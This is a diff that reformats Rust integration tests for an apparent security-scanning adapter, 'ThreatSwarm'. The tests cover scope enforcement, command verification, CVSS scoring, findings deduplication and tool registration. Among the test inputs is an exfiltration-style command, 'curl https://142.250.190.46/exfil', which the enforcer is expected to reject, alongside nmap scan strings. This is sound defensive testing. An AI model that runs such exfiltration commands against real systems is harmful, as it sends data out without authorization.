@@ -43,8 +43,16 @@ test.staging.io
     assert!(!enforcer.is_in_scope("attacker.staging.io.fake"));
 
     // Command verification contract
-    assert!(enforcer.verify_command("curl http://192.168.1.100/health").is_ok());
-    assert!(enforcer.verify_command("nmap -sV -p 443 api.internal.corp").is_ok());
+    assert!(
+        enforcer
+            .verify_command("curl http://192.168.1.100/health")
+            .is_ok()
+    );
+    assert!(
+        enforcer
+            .verify_command("nmap -sV -p 443 api.internal.corp")
+            .is_ok()
+    );
     assert!(enforcer.verify_command("cargo test --workspace").is_ok());
 
     let egress_err = enforcer.verify_command("curl https://142.250.190.46/exfil");
@@ -61,7 +69,10 @@ fn test_threatswarm_cvss_engine_and_sla_metrics() {
     let rce_score = rce.calculate_score();
     assert_eq!(rce_score, 9.8);
     assert_eq!(rce.severity_tier(), NormalizedSeverity::Critical);
-    assert_eq!(ThreatswarmCvssEngine::remediation_sla_hours(NormalizedSeverity::Critical), 24);
+    assert_eq!(
+        ThreatswarmCvssEngine::remediation_sla_hours(NormalizedSeverity::Critical),
+        24
+    );
 
     let profile = ThreatswarmCvssEngine::format_risk_profile(&rce);
     assert!(profile.contains("Base Score: 9.8"));
@@ -72,7 +83,10 @@ fn test_threatswarm_cvss_engine_and_sla_metrics() {
     let sqli_score = sqli.calculate_score();
     assert_eq!(sqli_score, 8.1);
     assert_eq!(sqli.severity_tier(), NormalizedSeverity::High);
-    assert_eq!(ThreatswarmCvssEngine::remediation_sla_hours(NormalizedSeverity::High), 72);
+    assert_eq!(
+        ThreatswarmCvssEngine::remediation_sla_hours(NormalizedSeverity::High),
+        72
+    );
 
     // Parse explicit vector
     let vec_str = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H";
@@ -135,7 +149,8 @@ fn test_threatswarm_findings_sync_and_deduplication() {
     assert_eq!(summary.total_high, 2);
 
     let summary_md_path = temp.path().join("FINDINGS_SUMMARY.md");
-    ThreatswarmFindingSync::write_summary_markdown(&summary, &summary_md_path).expect("Write summary");
+    ThreatswarmFindingSync::write_summary_markdown(&summary, &summary_md_path)
+        .expect("Write summary");
 
     let saved_md = fs::read_to_string(&summary_md_path).expect("Read summary markdown");
     assert!(saved_md.contains("# ThreatSwarm Findings Summary"));
@@ -190,13 +205,18 @@ export function forwardTraffic(payload: any) {
     };
 
     let cancel = CancellationToken::new();
-    let response = adapter.analyze(&request, &cancel).expect("Analysis must succeed");
+    let response = adapter
+        .analyze(&request, &cancel)
+        .expect("Analysis must succeed");
 
     assert_eq!(response.schema_version, "1.0");
     assert_eq!(response.run_id, "run-ts-integ-001");
     assert_eq!(response.engine_id, "threatswarm-deep-adapter");
     assert_eq!(response.snapshot_sha256, snapshot_sha256);
-    assert!(response.validate().is_ok(), "Response must pass protocol v1.0 validation");
+    assert!(
+        response.validate().is_ok(),
+        "Response must pass protocol v1.0 validation"
+    );
 
     // Findings verification
     assert_eq!(response.findings.len(), 2);
@@ -206,7 +226,10 @@ export function forwardTraffic(payload: any) {
         .find(|f| f.rule_id == Some("threatswarm.scope.unauthorized_egress".to_string()))
         .expect("Egress finding must exist");
     assert_eq!(egress_finding.severity, NormalizedSeverity::High);
-    assert_eq!(egress_finding.evidence_certainty, EvidenceCertaintyV1::StronglySupported);
+    assert_eq!(
+        egress_finding.evidence_certainty,
+        EvidenceCertaintyV1::StronglySupported
+    );
     assert_eq!(egress_finding.weakness_ids, vec!["CWE-918".to_string()]);
 
     let tls_finding = response
@@ -215,7 +238,10 @@ export function forwardTraffic(payload: any) {
         .find(|f| f.rule_id == Some("threatswarm.defense.disabled_tls_validation".to_string()))
         .expect("TLS finding must exist");
     assert_eq!(tls_finding.severity, NormalizedSeverity::High);
-    assert_eq!(tls_finding.evidence_certainty, EvidenceCertaintyV1::StronglySupported);
+    assert_eq!(
+        tls_finding.evidence_certainty,
+        EvidenceCertaintyV1::StronglySupported
+    );
     assert_eq!(tls_finding.weakness_ids, vec!["CWE-295".to_string()]);
 
     // Receipts verification
@@ -233,15 +259,37 @@ fn test_threatswarm_broker_registration_contract() {
     let cap = broker.discover_tool("threatswarm");
     assert_eq!(cap.tool_id, "threatswarm-deep-adapter");
     assert_eq!(cap.installation, bug_killer::deep::Installation::Available);
-    assert_eq!(cap.governance.license_review, bug_killer::deep::LicenseReview::Approved);
-    assert!(cap.capabilities.check_ids.contains(&"threatswarm.scope.unauthorized_egress".to_string()));
-    assert!(cap.capabilities.check_ids.contains(&"threatswarm.defense.disabled_tls_validation".to_string()));
-    assert!(cap.capabilities.check_ids.contains(&"threatswarm.cvss.base_score".to_string()));
-    assert!(cap.capabilities.check_ids.contains(&"threatswarm.mitre.technique_map".to_string()));
+    assert_eq!(
+        cap.governance.license_review,
+        bug_killer::deep::LicenseReview::Approved
+    );
+    assert!(
+        cap.capabilities
+            .check_ids
+            .contains(&"threatswarm.scope.unauthorized_egress".to_string())
+    );
+    assert!(
+        cap.capabilities
+            .check_ids
+            .contains(&"threatswarm.defense.disabled_tls_validation".to_string())
+    );
+    assert!(
+        cap.capabilities
+            .check_ids
+            .contains(&"threatswarm.cvss.base_score".to_string())
+    );
+    assert!(
+        cap.capabilities
+            .check_ids
+            .contains(&"threatswarm.mitre.technique_map".to_string())
+    );
 
     let all_tools = broker.discover_all();
     let ts_tool = all_tools
         .iter()
         .find(|t| t.tool_id == "threatswarm-deep-adapter");
-    assert!(ts_tool.is_some(), "threatswarm-deep-adapter must be in discover_all results");
+    assert!(
+        ts_tool.is_some(),
+        "threatswarm-deep-adapter must be in discover_all results"
+    );
 }
